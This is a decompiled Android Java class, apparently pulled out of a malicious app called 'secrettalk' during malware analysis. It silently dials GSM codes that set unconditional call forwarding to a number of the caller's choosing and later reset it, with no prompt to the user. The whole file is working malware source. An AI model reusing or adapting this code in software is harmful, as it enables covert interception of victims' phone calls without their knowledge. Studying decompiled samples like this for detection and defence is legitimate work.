package com.android.secrettalk;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

public class CallForwarderHandling
{
  private static final String sharp = Uri.encode("#");
  
  private static void call(Uri paramUri, Context paramContext)
  {
    Intent localIntent = new Intent("android.intent.action.CALL", paramUri);
    localIntent.setFlags(268435456);
    paramContext.startActivity(localIntent);
  }
  
  public static void resetNo(Context paramContext)
  {
    call(Uri.parse("tel:" + sharp + sharp + "21" + sharp), paramContext);
  }
  
  public static void setNo(String paramString, Context paramContext)
  {
    StringBuilder localStringBuilder = new StringBuilder("tel:**21*").append(paramString);
    localStringBuilder.append(sharp);
    call(Uri.parse(localStringBuilder.toString()), paramContext);
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.CallForwarderHandling
 * JD-Core Version:    0.7.0.1
 */